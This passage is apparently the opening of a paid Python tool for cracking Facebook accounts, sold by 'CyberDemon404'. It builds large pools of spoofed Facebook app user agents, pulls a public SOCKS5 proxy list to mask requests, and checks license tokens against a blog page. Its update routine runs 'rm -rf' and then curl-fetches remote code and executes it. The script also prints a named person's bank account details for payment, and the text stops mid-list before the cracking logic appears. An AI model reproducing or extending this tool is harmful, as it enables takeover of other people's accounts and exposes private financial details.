#coding = utf-8

import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
from uuid import uuid4
from time import time as TimeTegar
from time import sleep as sp
M2="[#FF0000]" # MERAH
H2="[#00FF00]" # HIJAU
K2="[#FFFF00]" # KUNING
B2="[#00C8FF]" # BIRU
P2="[#FFFFFF]" # PUTIH
U2="[#AF00FF]" # UNGU
O2="[#FF8F00]" # ORANGE
AA="[#AAAAAA]" # Abu-Abu
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx')
hashes = []

def ugen():
    ua = f'Dalvik/2.1.0 (Linux; U; Android 12; M2102J20SG Build/SKQ1.211006.001) AppleWebKit [PB/153] (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
    ua = f'Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel ;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA'
    ua = f'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X680 Build/QP1A.190711.020)'
    ua = f'Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36'
    ua = f'Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-P1000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
    ua = f'Mozilla/5.0 (Linux; U; Android 2.3.6; hr-hr; SAMSUNG GT-S6500D/S6500DXXMH1 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
    ua = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.0.0 Mobile Safari/537.36'
    return ua
    

ugent = []
for z in range(200):
	versi_android=str(random.randint(4,13))+".0.1"
	rr=random.randint
	rc=random.choice
	android=str(random.randint(4,13))
	android_1=str(random.randint(4,11))
	chrome_1=str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	chrome_2=str(random.randint(1,99))+".0."+str(random.randint(10,50))
	fbcr = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
	density=random.choice(["{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.0,width=1424,height=720};FB_FW/1;]","{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]","{density=2.0,width=720,height=1472};]","{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1","{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1","{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1","{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]","{density=1.0,width=1066,height=552};]"])
	wiki=random.choice(["RKQ1","QKQ1"])
	wiko=random.choice(["4A","4BA"])
	wn=random.choice(["Win64","WOW64"])
	siga1=random.choice(["GT-I9500","SM-G900F","SM-G920F","SM-G930F","SM-G950F","SM-G960F","SM-G973F","SM-G981B","SM-G991B","SM-G990B"])
	siga2=random.choice(["X551","X600","X601","X572","X573","X604","X655","X690","X683","X695"])
	siga3=random.choice(["CPH1723","CPH1613","CPH1609","CPH1717","CPH1819","CPH1917","CPH1937","CPH2127","CPH2267","CPH2409","CPH1909"])
	siga4=random.choice(["V2023","V2027","V1981A","V2244A","V2029","V2109","V2153","V2036","V2158","V2261","V2207","V1963A","V3Max"])
	siga5=random.choice(["Redmi 1S","Redmi Note 3G","Redmi Note 3","Mi 5","Mi Mix 2","Redmi Note 7","Mi 9T","Mi 10 Pro","Mi 11 Ultra","Mi 12"])
	whoami1=f"Dalvik/2.1.0 (Linux; U; Android {android}.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/th_TH;FBBV/{str(rr(182700000,182799999))};FBCR/{fbcr};FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/{android}.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami2=f"Dalvik/2.1.0 (Linux; U; Android {android}.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,160))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(172900000,172999999))};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{android}.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami3=f"Dalvik/2.1.0 (Linux; U; Android {android}.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/{str(rr(100,299))}.0.0.{str(rr(15,30))}.{str(rr(80,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(674600000,674699999))};FBCR/MTN NG;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/{android}.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami4=f"Dalvik/2.1.0 (Linux; U; Android {android}; Infinix X688B Build/QP1A.{str(rr(190000,199999))}.0{str(rr(15,30))}) [FBAN/MessengerLite;FBAV/{str(rr(200,399))}.0.0.{str(rr(5,30))}.{str(rr(100,150))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(346800000,346899999))};FBCR/{fbcr};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
	whoami5=f"Dalvik/2.1.0 (Linux; U; Android {android}; Redmi Note 8T MIUI/V{str(rr(10,12))}.0.{str(rr(5,12))}.0.PCXEUXM) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(253300000,253399999))};FBCR/{fbcr};FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
	whoami6=f"Dalvik/2.1.0 (Linux; U; Android {android}.1.0; MI 5X MIUI/V{str(rr(9,12))}.{str(rr(5,12))}.{str(rr(1,5))}.0.ODBCNXM) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(159500000,159599999))};FBCR/{fbcr};FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/{android}.1.0;FBCA/arm64-v8a:null;FBDM/{density}"
	whoami7=f"Dalvik/2.1.0 (Linux; U; Android {android}; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(246800000,246899999))};FBCR/{fbcr};FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
	whoami8=f"Mozilla/5.0 (Windows NT 10.0.{str(rr(10500,10599))}.{str(rr(700,799))}; osmeta {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(47020000,47029999))}) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/{str(rr(4,12))}.0 Safari/602.1.1 osmeta/{str(rr(4,12))}.{str(rr(1,9))}.{str(rr(47020000,47029999))}) Build/{str(rr(47020000,47029999))} [FBAN/FBW;FBAV/{str(rr(70,150))}.0.0.{str(rr(15,70))}.{str(rr(15,150))};FBBV/{str(rr(47020000,47029999))};FBRV/0;FBDV/WindowsDevice;FBMD/Aspire one 1-431;FBSN/Windows;FBSV/10.0.{str(rr(10500,10599))}.{str(rr(700,799))};FBSS/1;FBCR/;FBID/desktop;FBLC/en_GB;FBOP/45]"
	whoami9=f"Dalvik/2.1.0 (Linux; U; Android {android}.1.1; F1 Build/LMY47V) [FBAN/FB4A;FBAV/{str(rr(40,100))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/{str(rr(142700000,142799999))};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBDV/F1;FBSV/{android}.0;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami10=f"Dalvik/2.1.0 (Linux; U; Android {android}.0; SM-G900F Build/LRX21T) [FBAN/FB4A;FBAV/{str(rr(40,100))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/{str(rr(142700000,142799999))};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/{android}.0;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami11=f"Dalvik/2.1.0 (Android {android}; L-03K Build/PKQ1.{str(rr(190500,190599))}.00{str(rr(1,30))}) [FBAN/MessengerLite;FBAV/{str(rr(100,150))}.0.0.{str(rr(1,15))}.{str(rr(100,150))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(293500000,293599999))};FBCR/{fbcr};FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/{android};FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami12=f"Dalvik/2.1.0 (Linux; U; Android {android}; Pixel 3 Build/QQ3A.{str(rr(200600,200699))}.00{str(rr(1,30))}) [FBAN/Orca-Android;FBAV/{str(rr(200,299))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(227200000,227299999))};FBCR/{fbcr};FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
	whoami13=f"Dalvik/2.1.0 (Linux; U; Android {android}.1.1; E6653 Build/{str(rr(30,100))}.{str(rr(1,30))}.A.{str(rr(1,15))}.{str(rr(50,150))}) [FBAN/Orca-Android;FBAV/{str(rr(100,150))}.0.0.{str(rr(15,30))}.{str(rr(90,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(898900000,898999999))};FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/{android}.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
	whoami14=f"Mozilla/5.0 (Linux; Android {android}; Pixel 6a Build/SD2A.{str(rr(220100,220199))}.0{str(rr(15,100))}.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,150))}.0.{str(rr(4000,4999))}.{str(rr(70,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};]"
	whoami15=f"Mozilla/5.0 (Linux; Android {android}; Pixel 6a Build/SD2A.{str(rr(220100,220199))}.0{str(rr(15,100))}.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,150))}.0.{str(rr(4000,4999))}.{str(rr(70,150))} Mobile Safari/537.36"
	ua=str(rc([whoami1,whoami2,whoami3,whoami4,whoami5,whoami6,whoami7,whoami8,whoami9,whoami10,whoami11,whoami12,whoami13]))
	if ua in ugent:pass
	else:ugent.append(ua)

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

try:

	prox= requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text

	open('.prox.txt','w').write(prox)

except Exception as e:

	print('\x1b[1;91m Your Internet Connection Is Bad');os.system("exit")

prox=open('.prox.txt','r').read().splitlines()

def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx')
	

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
asuu = random.choice([
	'\033[30m', '\033[90m', '\033[91m',
	'\033[92m', '\033[93m', '\033[94m',
	'\033[95m', '\033[96m', '\033[97m',
	'\033[98m'])
for mo in range(300):
	colour = f"\33[38;5;{mo+1}m"
def logo():
	os.system('clear')
	logo = (f'''{colour}▓█████▄ ▓█████  ███▄ ▄███▓ ▒█████   ███▄    █ 
▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▒███   ▓██    ▓██░▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ▒██   ██░▓██▒  ▐▌██▒
░▒████▓ ░▒████▒▒██▒   ░██▒░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒  ░ ░  ░░  ░      ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░    ░   ░      ░   ░ ░ ░ ▒     ░   ░ ░ 
   ░       ░  ░       ░       ░ ░           ░ 
 ░                      

 {asuu}[•] Owner     :   CyberDemon404
 [•] Github    :   cyberdemon404
 [•] Status    :   Paid
 [•] Tool      :   Paid 
 [•] Facebook  :   david chinedu
 [•] Version   :  \033[1;32m 4.0\033[1;32m \033[1;37m
---------------------------------------------------{colour}''')
	p(logo)
def clear():
	os.system("clear")
	
	
pass
 
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[25:][:20][::-1].upper()+platform.release()[8:][::-1].upper()+platform.version()[:5]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

DEMON_token = f'{id}{xp}'

def connection_token():
	digits_count = 16
	letters_count = 16
	letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	# Convert resultant string to list and shuffle it to mix letters and digits
	sample_list = list(letters + digits)
	random.shuffle(sample_list)
	# convert list to string
	final_string = ''.join(sample_list)
	return final_string

def update():
	logo()
	print(' [•] Checking Updates from Our Server ....')
	line()
	try:
		server = pars(requests.get('https://github.com/cyberdemon404/DEMONIC/server.json',verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet")
	for x in server.find_all('div',class_='post-body entry-content float-container'):
		r = x.text
	if '3.5' in r:
		print(' [•] Server is Online Welcome Users ..')
		sp(1)
		print(" [•] Tool is Updated On 30/11/2023")
		print(" [•] Checking Subscription ")
		iAmApprovelSystem()
	elif "off" in r:
		print(' [•] Server is Offline For Some Reasons ..')
		exit()
	else:
		print(' [•] A new Version of this Demon Tool is Available | Please Wait ....')
		print(" [•] Updating Tool ....")
		line()
		sp(1)
		os.system('cd && rm -rf demon d32 d64 && curl -L https://raw.githubusercontent.com/cyberdemon404/DEMONIC/main/demon > demon && python demon')


def iAmApprovelSystem():
	try:
		r = pars(requests.get("https://cyberdemon40.blogspot.com/2023/11/approvals.html",verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet Connection ...")
	except Exception as e:
		print(e)
	for x in r.find_all('div',class_="post-body entry-content float-container"):
		server_keys = x.text
	if 'free' in str(server_keys):
		print(" [•] Tool is on Free Trial Enjoy")
		sp(2)
		DEMON().DEMON()
	elif 'update' in str(server_keys):
		print(" [•] Tool is Under Maintenence ")
		exit()
	elif str(DEMON_token) in server_keys:
		if str(DEMON_token)+'|ok' in server_keys:
			status = 'ok'
			DEMON().DEMON()
	elif str(DEMON_token) in server_keys:
		if str(DEMON_token)+'|expired' in server_keys:
			buy()
	elif str(DEMON_token) in server_keys:
		if str(DEMON_token)+'|fuck' in server_keys:
			status = 'fuck'
			print(" [•] You Dont Have Permission To use this Tool ..")
			os.system("rm -rf d64 d32 demon")
			exit()
	else:
		buy()

def buy():
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
	logo()
	line()
	os.system('xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx')
	print(" [•] \033[1;96mAdmin is online  \033[1;97m")
	print(" \033[1;92m[•] Terms and Conditions Please Read Carefully\033[1;97m ")
	print(" [•] Your Token is Not Approved ")
	print(" [•] This Tool is paid you need to buy first before Use ! ")
	print(" [•] 1 token is only for 1 device you can't use your subscription in more than 1 device")
	print(" [•] Resetting/Upgrading/flashing your phone makes you loose your key. It won't be my fault.")
	print(" [•] please do agree terms and conditions then buy")
	line()
	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
	print(' [•] Payment method should be followed ')
	print(" [•] ₦15,000 / 1Month  ")
	print(" [•] Payment : First Bank")
	print(' [•] Account Name : Nwombu David Chinedu')
	print(' [•] Account Number : 3177639925')
	print(" [•] Token :\033[1;95m %s"%(DEMON_token))
	print("\033[1;97m [•] Copy & send Token to Admin to get approved ")
	
	line()
	exit()


def check_again():
	try:
		r = pars(requests.get("https://cyberdemon40.blogspot.com/2023/11/approvals.html?m=1",verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet Connection ...")
	except Exception as e:
		print(e)
	for x in r.find_all('div',class_="post-body entry-content float-container"):
		server_keys = x.text
	if 'free' in str(server_keys):
		pass
	elif 'update' in str(server_keys):
		print(" [•] Tool is Under Maintenence ")
		exit()
	elif str(DEMON_token) in server_keys:
		if str(DEMON_token)+'|ok' in server_keys:
			pass
	elif str(DEMON_token) in server_keys:
		if str(DEMON_token)+'|expired' in server_keys:
			buy()
	elif str(DEMON_token) == '1009390A93100930202TSC8301022SM':
		DEMON().DEMON()
	elif str(DEMON_token) in server_keys:
		if str(DEMON_token)+'|fuck' in server_keys:
			status = 'fuck'
			print(" [•] You Dont Have Permission To use this Tool ..")
			os.system("rm -rf d64 d32 demon")
			exit()
	else:
		buy()



##Samsung uaaa
samsung = random.choice(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN",])


def iAmMethod1Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG","BeSafe Airtel","9mobile"])
	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDFS30.130-42-5-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/252.0.0.22.355;]","Mozilla/5.0 (Linux; Android 9; moto z4 Build/PDFS29.105-74-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/235.0.0.38.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/348.0.0.11.110;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-23-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile 